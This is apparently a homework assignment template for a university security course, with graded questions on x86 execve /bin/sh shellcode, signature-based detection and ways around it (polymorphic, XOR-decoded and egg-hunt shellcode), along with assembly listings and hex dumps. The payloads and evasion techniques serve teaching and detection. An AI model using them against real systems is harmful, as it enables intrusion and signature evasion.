\documentclass{article}[9pt]

\usepackage{listings}
\usepackage{fullpage}
\usepackage{textcomp}
\usepackage{mdframed}
\usepackage{url}

\lstset{ %
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\small\emph,
  upquote=true,
  framerule=1.25pt,
  breaklines=true,
  showstringspaces=false,
  escapeinside={(*@}{@*)},
  belowskip=2em,
  aboveskip=1em,
}


\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}


%%%%%%%%%%%%%%%%%%%%%%%%%%
% To add an answer, use the myanswer environment command under \item heading,like
%
% \item What is the meaning of life, universe, everything?
% \begin{mysanswer}
%   The answer is 42!
% \end{myanswer}
%
% You can also use macro's in your \myanswer if you want to control the
% formatting. Such as verbatim environment or lstlisting environment.
%
% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
% so make sure your home work is well formatted.
%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{SI485h: HW 04}
\date{FILL IN THE DUE DATE}
\author{FILL IN YOUR NAME}

\begin{document}

\maketitle
\section*{Instructions}

\begin{itemize}
\item You must submit your homework using this Latex template.

\item This homework is graded out of 130 points. Point values are associated to each question.
\end{itemize}

\section*{Questions}
\label{sec:orgd7f8042}

\begin{enumerate}
\item Consider the following shell code as an improvement over
previously described jmp-callback shell code

\begin{verbatim}
SECTION .text
   global _start

_start:

   xor eax,eax

   push eax ;\0
   push 0x68 ;h
   push 0x73 ;s
   push 0x2f ;/
   push 0x6e ;n
   push 0x69 ;i
   push 0x62 ;b
   push 0x2f ;/

   mov esi,esp

   xor edx,edx
   push edx
   push esi

   mov ecx,esp
   mov ebx,esi
   mov al,0xb
   int 0x80

\end{verbatim}

\begin{enumerate}
\item (5 points) This shell code fails to decrease the total number of
bytes. Explain why? (You can compile and test against a
jmp-callback variant)

\item (5 points) This shell code \emph{also} fails to launch a shell. Explain why?

\item (5 points) Explain how to fix this shell code's push'es such that it will
actually launch a shell.

\item (5 points) When fixed, how many bytes is the shell code reduced by as
compared to the jmp-callback shell code?
\end{enumerate}

\item Consider the following shell code

\begin{verbatim}
SECTION .text
        global _start
_start:
        xor ecx,ecx
        mul ecx ;MARK 1

        push eax
        push 0x68732f6e
        push 0x69622f2f

        mov ebx,esp ;MARK 2
        mov al,0xb
        int 0x80 

\end{verbatim}

\begin{enumerate}
\item (5 points) At MARK 1, explain why \texttt{mul ecx} will zero out the register \texttt{eax} and \texttt{edx}.

\item (5 points) At MARK 2, how come we are not creating an argv array for
execve? What arguments are we passing instead?

\item (5 points) How many bytes is this shell code?
\end{enumerate}

\item Consider the following shell code. 

\begin{verbatim}
SECTION .text
        global _start:

_start:
        cdq ; or cltrd
        push 0xb
        pop eax
        pusha
        pop ecx
        int 0x80
\end{verbatim}

\begin{enumerate}
\item (5 points) Provide an english-language description of the process of this shell code

\item (5 points) Will this shell code work consistently?

\item (5 points) How would you use this shell code to launch a shell?

\item (5 points) How many bytes is this shell code?
\end{enumerate}

\item (10 points) Go to the shell code repository on shell-storm

\url{http://shell-storm.org/shellcode/}

Choose a shell code from the Intel x86 header, compile and run
that shell code, and describe it's properties and something
interesting you learned from it. Be sure to include the code.

\item Consider the simple signature matching instruction detection scheme:

\begin{verbatim}
int sig_check(char * p){
  for(;*p;p++)
    if (strncmp(p,"sh",2) == 0){
      return 1;
  return 0;
}
\end{verbatim}

\begin{enumerate}
\item (5 points) Will the shell code below be detected by the signature scheme, yes or no and \textbf{Explain}. 

\begin{verbatim}
8048060: 31 c9            xor ecx,ecx
8048062: f7 e1            mul ecx
8048064: 50               push eax
8048065: 68 6e 2f 73 68   push 0x68732f6e
804806a: 68 2f 2f 62 69   push 0x69622f2f
804806f: 89 e3            mov ebx,esp
8048071: b0 0b            mov al,0xb
8048073: cd 80            int 0x80
\end{verbatim}

\item (5 points) Will the shell code below be detected by the signature scheme, yes or no and \textbf{Explain}.

\begin{verbatim}
8048060: 31 c9             xor ecx,ecx
8048062: f7 e1             mul ecx
8048064: 6a 68             push 0x68
8048066: 68 6e 2f 2f 73    push 0x732f2f6e
804806b: 68 2f 2f 62 69    push 0x69622f2f
8048070: 89 e3             mov ebx,esp
8048072: b0 0b             mov al,0xb
8048074: cd 80             int 0x80
\end{verbatim}
\end{enumerate}

\item Consider this signature matching scheme below:

\begin{verbatim}
int sig_check(char *str, char * sig0, char *sig1){
  char *p;
  for(p=str;*p;p++){
    if ( strncmp(p,sig0,strlen(sig0)) == 0 )
      if (strncmp(p+strlen(sig0),sig1,strlen(sig1)) == 0)
        return 1;
    return 0;
  }
}
\end{verbatim}

\begin{enumerate}
\item (5 points) Provide a signatures (i.e., arguments to \texttt{sig\_check} above) that
will match both shell codes (from the previous questions) use
of the execve system call.

\item (5 points) Consider the following change to the shell code below, does
your previous signature still work? If so, explain why, if not,
explain why not.

\begin{verbatim}
8048060: 31 c9             xor ecx,ecx
8048062: f7 e1             mul ecx
8048064: 6a 68             push 0x68
8048066: 68 6e 2f 2f 73    push 0x732f2f6e
804806b: 68 2f 2f 62 69    push 0x69622f2f
8048070: b1 0b             mov cl,0xb
8048072: 89 e3             mov ebx,esp
8048074: 40                inc eax
8048075: e2 fd             loop 8048074 <_start+0x14>
8048077: cd 80             int 0x80
\end{verbatim}
\end{enumerate}

\item (5 points) Does the shell code below match either (or both) of the signature schemes from the previous questions? 

\begin{verbatim}
8048060: 68 80 90 90 90  push 0x90909080
8048065: 68 e3 b0 0b cd  push 0xcd0bb0e3
804806a: 68 2f 62 69 89  push 0x8969622f
804806f: 68 73 68 68 2f  push 0x2f686873
8048074: 68 50 68 6e 2f  push 0x2f6e6850
8048079: 68 31 c9 f7 e1  push 0xe1f7c931
804807e: ff d4           call esp
\end{verbatim}

\item (5 points) What is polymorphic shell code? How does it relate to the shortcomings of the signature matching scheme from before?

\item (5 points) What is decode shell code? Would decoder shell code be immune from signature matching schemes?

\item Consider the following decode based shell code

\begin{verbatim}
8048060: 68 6f 2e 3d 4e     push 0x4e3d2e6f
8048065: 68 0c 0e a6 13     push 0x13a60e0c
804806a: 68 c0 dc c4 57     push 0x57c4dcc0
804806f: 68 9c d6 c5 f1     push 0xf1c5d69c
8048074: 68 be d6 c3 f1     push 0xf1c3d6be
8048079: 68 de 77 5a 3f     push 0x3f5a77de
804807e: 31 c9              xor ecx,ecx
8048080: 8b 04 0c           mov eax,DWORD PTR [esp+ecx*1]
8048083: 35 ef be ad de     xor eax,0xdeadbeef
8048088: 89 04 0c           mov DWORD PTR [esp+ecx*1],eax
804808b: 80 c1 04           add cl,0x4
804808e: 80 f9 14           cmp cl,0x14
8048091: 7e ed              jle 8048080 <_start+0x20>
8048093: ff e4              jmp esp
\end{verbatim}

\begin{enumerate}
\item (5 points) What is the decode key? Explain how you know this.

\item (5 points) Why is the comparison (\texttt{cmp}) comparing to 0x14 for loop exit?

\item (5 points) Explain the last instruction's relevance \texttt{jmp esp}.
\end{enumerate}

\item (5 points) In egg-hunt shell code, why should the egg appear twice?

\item (5 points) Why do we use \texttt{access()} system call in egghunt shell code?

\item (5 points) In the example below, why does the shell code being hunted for get loaded into memory?

\begin{verbatim}
./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
\end{verbatim}
\end{enumerate}
\end{document}